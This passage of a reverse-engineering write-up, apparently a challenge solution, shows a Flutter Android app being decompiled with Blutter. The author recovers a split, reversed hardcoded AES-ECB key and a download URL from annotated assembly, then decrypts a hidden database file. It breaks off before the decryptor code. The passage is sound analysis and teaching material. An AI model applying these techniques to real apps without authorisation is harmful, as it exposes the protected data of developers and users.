code\u003C/li>\n\u003Cli>An Object Pool with string literals and constants\u003C/li>\n\u003Cli>Type information and metadata\u003C/li>\n\u003C/ul>\n\u003Cp>This compilation method makes traditional APK analysis tools (like jadx or dex2jar) useless, as there’s no DEX bytecode to decompile:(\u003C/p>\n\u003Cp>We extracted the APK to access the native libraries:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> mkdir\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> apk_extracted\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> unzip\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -q\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> base.apk\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -d\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> apk_extracted/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ls\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -lh\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> apk_extracted/lib/arm64-v8a/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">total\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 16M\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 4.7M\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Jan\u003C/span>\u003Cspan style=\"color:#79B8FF\">  1\u003C/span>\u003Cspan style=\"color:#79B8FF\">  1981\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> libapp.so\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  11M\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Jan\u003C/span>\u003Cspan style=\"color:#79B8FF\">  1\u003C/span>\u003Cspan style=\"color:#79B8FF\">  1981\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> libflutter.so\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The \u003Ccode>libapp.so\u003C/code> file (4.7 MB) contains all the application logic we need to reverse engineer.\u003C/p>\n\u003Cp>Blutter, a portmanteau of “B(l)utter” that plays on both \u003Cem>buttering\u003C/em> and \u003Cem>Flutter\u003C/em>, is a reverse engineering tool built specifically with Flutter applications in mind. Unlike traditional disassemblers that treat Flutter binaries as opaque native code, Blutter understands the internal structure of the Dart VM snapshot embedded inside \u003Ccode>libapp.so\u003C/code>. It is able to parse this snapshot, extract the object pool that contains constants, strings, and type information, and use that data to reconstruct readable pseudo-Dart code complete with symbols and function names. In addition to this higher-level reconstruction, Blutter can also generate annotated assembly listings that bridge the gap between low-level instructions and Dart-level logic, and even produce Frida scripts to assist with dynamic analysis and runtime instrumentation.\u003C/p>\n\u003Cp>When we run Blutter, it performs several automated steps:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> python3\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> blutter.py\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> /path/to/apk_extracted/lib/arm64-v8a\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> /path/to/blutter_output\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>During execution, Blutter follows a fairly involved but systematic process to adapt itself to the exact Flutter application being analyzed. It begins by inspecting \u003Ccode>libflutter.so\u003C/code> to determine the precise Dart SDK version used when the app was compiled. This step is essential, as the internal layout of Dart VM snapshots varies between versions, and using the wrong format would make accurate parsing impossible. In this case, Blutter identifies the app as being built with Dart 3.7.2, along with the associated snapshot hash, target architecture, and compilation flags, all of which guide the rest of the analysis.\u003C/p>\n\u003Cp>If a matching analysis backend for that Dart version is not already available, Blutter automatically prepares one. It fetches the Dart SDK source from the official repository, checks out the exact version tag, and compiles the Dart VM runtime into a static library tailored to the target architecture. Blutter then rebuilds its own analysis components against this library, a process that can take several minutes and produces verbose build output as each part of the VM is compiled and linked.\u003C/p>\n\u003Cp>Once the environment is ready, Blutter moves on to snapshot analysis. It parses \u003Ccode>libapp.so\u003C/code> to locate the embedded Dart VM snapshot, extracts the object pool containing constants and string literals, reconstructs the application’s class hierarchy, and identifies function entry points to recover the overall code structure. Using this information, Blutter generates its final artifacts, producing annotated assembly listings, reconstructed function and class definitions, inline constants, and a mapped control flow for each Dart library. At the end of the process, it also generates a Frida script, enabling dynamic instrumentation of the recovered logic during runtime analysis.\u003C/p>\n\u003Ch3 id=\"examining-the-output-structure\">Examining the Output Structure\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ls\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -la\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> blutter_output/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">total\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1524\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">drwxr-xr-x\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\">     86\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 18:56\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> .\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">drwxr-x--x\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\">    894\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 18:56\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ..\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">drwxr-xr-x\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\">    478\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 18:56\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> asm/\u003C/span>\u003Cspan style=\"color:#6A737D\">              # Assembly listings\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 221632\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 18:56\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> blutter_frida.js\u003C/span>\u003Cspan style=\"color:#6A737D\">  # Frida script template\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">drwxr-xr-x\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\">     56\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 18:56\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ida_script/\u003C/span>\u003Cspan style=\"color:#6A737D\">       # IDA Pro integration\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 376330\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 18:56\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> objs.txt\u003C/span>\u003Cspan style=\"color:#6A737D\">          # Nested object dump\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 957372\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 18:56\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> pp.txt\u003C/span>\u003Cspan style=\"color:#6A737D\">            # Complete Object Pool\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ls\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> blutter_output/asm/\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> head\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -10\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">accessmydata/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">async/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">characters/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">collection/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">.dart_tool/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">dio/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">encrypt/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">flutter/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">...\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The \u003Ccode>asm/\u003C/code> directory contains subdirectories for each Dart package used in the app. Our target is \u003Ccode>accessmydata/main.dart\u003C/code>.\u003C/p>\n\u003Ch3 id=\"locating-the-main-application-code\">Locating the Main Application Code\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ls\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -lh\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> blutter_output/asm/accessmydata/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">total\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 52\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">-rw-r--r--\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> muffin\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 51467\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Dec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 30\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 18:56\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> main.dart\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The \u003Ccode>main.dart\u003C/code> file contains 51 KB of annotated assembly code representing the application’s core logic.\u003C/p>\n\u003Cp>Blutter generates assembly listings that interleave ARM64 assembly with Dart-level semantic comments. Here’s an example of the format:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>_ _decryptData(/* No info */) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  // addr: 0x2db4c0, size: 0x174\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  // 0x2db4c0: EnterFrame\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      0x2db4c0: stp             fp, lr, [SP, #-0x10]!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      0x2db4c4: mov             fp, SP\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>  // 0x2db4c8: AllocStack(0x30)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      0x2db4c8: sub             SP, SP, #0x30\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Explanation:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>Function signature\u003C/strong>: \u003Ccode>_ _decryptData(/* No info */)\u003C/code> - Dart function name\u003C/li>\n\u003Cli>\u003Cstrong>Address and size\u003C/strong>: addr: 0x2db4c0, size: 0x174 (372 bytes)\u003C/li>\n\u003Cli>\u003Cstrong>Comments\u003C/strong>: \u003Ccode>// 0x2db4c0: EnterFrame\u003C/code> - high-level operation\u003C/li>\n\u003Cli>\u003Cstrong>Assembly\u003C/strong>: \u003Ccode>0x2db4c0: stp fp, lr, [SP, #-0x10]!\u003C/code> - actual ARM64 instruction\u003C/li>\n\u003Cli>\u003Cstrong>PP references\u003C/strong>: \u003Ccode>[PP, #0x90]\u003C/code> - references to the Object Pool\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"extracting-the-encryption-keys\">Extracting the Encryption Keys\u003C/h3>\n\u003Cp>the download URL:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>    // 0x304ed8: r16 = \"https://github.com/chicken-jockeyy/confidentialdb/raw/refs/heads/main/enc.bin\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     0x304ed8: add             x16, PP, #0xd, lsl #12  ; [pp+0xd348] \"https://github...\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    /     0x304edc: ldr             x16, [x16, #0x348]\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>These literal strings are stored in the Object Pool (PP) and loaded into registers for use.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>    // Load key part 1 into x16\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    // 0x2db4f8: r16 = \"04e0d32be85f3b42\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     0x2db4f8: add             x16, PP, #0xb, lsl #12\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    /     0x2db4fc: ldr             x16, [x16, #0x5a0]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    // Load key part 2 into x30 (lr)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    // 0x2db500: r30 = \"7173047a9d6574e5\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     0x2db500: add             lr, PP, #0xb, lsl #12\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    /     0x2db504: ldr             lr, [lr, #0x5a8]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    // Push both parts onto stack\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    // 0x2db508: stp             lr, x16, [SP]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    // 0x2db50c: r0 = +()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     Concatenate the two strings: \"04e0d32be85f3b427173047a9d6574e5\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Then the code creates a reversed iterable:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>    // 0x2db540: r0 = ReversedListIterable()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     0x2db540: bl              #0x2bee38  ; AllocateReversedListIterableStub\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    // 0x2db558: r0 = join()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     0x2db558: bl              #0x28e4f8  ; [dart:_internal] ListIterable::join\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This reverses the concatenated key string character by character:\u003C/p>\n\u003Cul>\n\u003Cli>Original: \u003Ccode>04e0d32be85f3b427173047a9d6574e5\u003C/code>\u003C/li>\n\u003Cli>Reversed: \u003Ccode>5e4756d9a740371724b3f58eb23d0e40\u003C/code>\u003C/li>\n\u003C/ul>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>    // 0x2db564: r0 = Key()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     Create an encryption key object\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    // 0x2db578: r0 = AES()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     0x2db578: bl              #0x304864  ; AllocateAESStub -> AES\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    // 0x2db588: r0 = AES()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     0x2db588: bl              #0x2db870  ; [package:encrypt/encrypt.dart] AES::AES\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     Initialize AES cipher with the reversed key\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>To find which AES mode is used, we examined the Object Pool dump:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">$\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> grep\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -i\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"ecb\\|AESMode\"\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> blutter_output/pp.txt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[pp+0xb5d8] Obj\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#B392F0\">AESMode@5032b1\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> :\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    off_10:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"ecb\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[pp+0xb5f0] \u003C/span>\u003Cspan style=\"color:#B392F0\">Map\u003C/span>\u003Cspan style=\"color:#E1E4E8\">&#x3C;AESMode, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">Strin\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g\u003C/span>\u003Cspan style=\"color:#9ECBFF\">>(\u003C/span>\u003Cspan style=\"color:#B392F0\">8\u003C/span>\u003Cspan style=\"color:#9ECBFF\">)\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  Obj!AESMode@503291:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"CBC\",\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  Obj!AESMode@503271:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"CFB-64\",\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  Obj!AESMode@503251:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"CTR\",\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  Obj!AESMode@5032b1:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"ECB\",\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  Obj!AESMode@503231:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"OFB-64/GCTR\",\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  Obj!AESMode@503211:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"OFB-64\",\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">  ...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Cross-referencing with the assembly:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>    // 0x2db880: r4 = Instance_AESMode\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     0x2db880: add             x4, PP, #0xb, lsl #12  ; [pp+0xb5d8] Obj!AESMode@5032b1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    /     0x2db884: ldr             x4, [x4, #0x5d8]\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The constant at \u003Ccode>pp+0xb5d8\u003C/code> is \u003Ccode>Obj!AESMode@5032b1\u003C/code>, which corresponds to \u003Cstrong>“ECB”\u003C/strong> mode in the enum map.\u003C/p>\n\u003Ch4 id=\"step-4-decryption-and-base64-decode\">Step 4: Decryption and Base64 Decode\u003C/h4>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>    // 0x2db5b8: r0 = decrypt()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     0x2db5b8: bl              #0x2db6a0  ; [package:encrypt/encrypt.dart] Encrypter::decrypt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     Decrypt the encrypted data using AES-ECB\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    // 0x2db5c0: r0 = base64Decode()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     0x2db5c0: bl              #0x2db634  ; [dart:convert] ::base64Decode\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>    //     Decode the decrypted Base64 string to binary\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Col>\n\u003Cli>\n\u003Cp>\u003Cstrong>Key Preparation\u003C/strong>:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>key_part1 = \"04e0d32be85f3b42\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>key_part2 = \"7173047a9d6574e5\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>combined = \"04e0d32be85f3b427173047a9d6574e5\"  (32 characters)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>reversed = \"5e4756d9a740371724b3f58eb23d0e40\"  (32 characters → 16 bytes UTF-8)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Download encrypted file\u003C/strong>:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>URL: https://github.com/chicken-jockeyy/confidentialdb/raw/refs/heads/main/enc.bin\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Size: 12,582,928 bytes\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>AES-ECB Decryption\u003C/strong>:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Cipher: AES-128 (128-bit key = 16 bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Mode: ECB (Electronic Codebook)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Key: \"5e4756d9a7403717\" + \"24b3f58eb23d0e40\" (16 ASCII characters)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Input: enc.bin (raw binary data)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Output: Base64-encoded string\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>Base64 Decoding\u003C/strong>:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Input: Base64 string (from AES decryption)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Output: decrypted.realm (9,437,184 bytes)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003C/li>\n\u003C/ol>\n\u003Chr>\n\u003Ch2 id=\"part-6-implementing-the-decryptor\">Part 6: Implementing the 